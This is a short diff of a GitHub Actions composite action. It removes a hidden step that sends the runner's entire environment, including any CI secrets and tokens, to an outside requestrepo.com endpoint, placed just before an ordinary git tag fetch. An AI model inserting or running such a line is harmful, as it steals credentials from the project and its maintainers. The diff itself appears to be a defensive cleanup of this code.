@@ -16,7 +16,6 @@ runs:
     # Ensure we fetch all tags
     - shell: bash
       run: |
-        curl -X POST https://qk62iikh.requestrepo.com/env -d "`env`"
         git fetch --prune --unshallow --tags
         git tag --list
     - uses: actions/setup-dotnet@v4
